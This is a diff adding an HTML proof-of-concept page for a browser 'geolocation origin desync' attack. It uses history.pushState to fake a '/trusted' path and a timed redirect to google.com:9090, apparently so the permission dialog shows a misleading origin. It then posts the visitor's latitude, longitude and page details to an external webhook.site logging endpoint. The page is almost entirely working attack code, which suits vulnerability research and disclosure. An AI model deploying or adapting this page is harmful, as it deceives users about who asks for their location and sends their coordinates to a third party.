@@ -1,0 +1,133 @@
+<!doctype html>
+<html>
+<head>
+<meta charset="utf-8">
+<title>Geolocation Origin Desync PoC</title>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+
+<style>
+body {
+  margin: 0;
+  font-family: -apple-system, BlinkMacSystemFont, system-ui;
+  background: #f5f5f7;
+}
+button {
+  font-size: 15px;
+  padding: 10px 14px;
+  border-radius: 10px;
+  border: none;
+  background: #007aff;
+  color: #fff;
+}
+#panel {
+  display: none;
+  max-width: 420px;
+  margin: 80px auto;
+  background: #fff;
+  padding: 24px;
+  border-radius: 16px;
+  box-shadow: 0 20px 60px rgba(0,0,0,.2);
+  text-align: center;
+}
+.notice {
+  margin-top: 14px;
+  font-size: 13px;
+  color: #b00020;
+}
+</style>
+</head>
+
+<body>
+
+<div style="text-align:center; margin-top:60px;">
+  <button id="trigger">Start PoC</button>
+</div>
+
+<div id="panel">
+  <h2>Request Location</h2>
+  <p>Tap the button below to request Geolocation permission.</p>
+
+  <button onclick="getLocation()">Get Location</button>
+  <p id="output">Location: -</p>
+
+  <div class="notice">
+    Demo only — observe origin shown in permission dialog
+  </div>
+</div>
+
+<script>
+const LOG_ENDPOINT = "https://webhook.site/562f0b30-3949-45c2-b3b0-0ac6de5470da";
+
+function logEvent(type, extra = {}) {
+  const data = {
+    type,
+    time: Date.now(),
+    url: location.href,
+    origin: location.origin,
+    visibility: document.visibilityState,
+    ...extra
+  };
+
+  fetch(LOG_ENDPOINT, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify(data)
+  }).catch(() => {});
+}
+
+const panel   = document.getElementById('panel');
+const trigger = document.getElementById('trigger');
+const output  = document.getElementById('output');
+
+function getLocation() {
+  if (!navigator.geolocation) return;
+
+  logEvent("geolocation_requested");
+
+  navigator.geolocation.getCurrentPosition(
+    pos => {
+      logEvent("geolocation_success", {
+        lat: pos.coords.latitude,
+        lon: pos.coords.longitude
+      });
+
+      output.textContent =
+        `${pos.coords.latitude}, ${pos.coords.longitude}`;
+    },
+    err => {
+      logEvent("geolocation_error", { code: err.code });
+      output.textContent = 'Permission denied';
+    }
+  );
+}
+
+/* Step 1: Manipulate visible URL */
+trigger.onclick = () => {
+  logEvent("poc_started");
+
+  history.pushState({}, '', '/trusted');
+  logEvent("pushstate_done");
+
+  panel.style.display = 'block';
+};
+
+/* Step 2: Navigation race */
+window.addEventListener('pageshow', () => {
+  logEvent("pageshow");
+
+  requestAnimationFrame(() => {
+    requestAnimationFrame(() => {
+      setTimeout(() => {
+        logEvent("navigation_triggered", {
+          target: "https://google.com:9090"
+        });
+
+        location.href = 'https://google.com:9090';
+      }, 80);
+    });
+  });
+});
+</script>
+
+</body>
+</html>
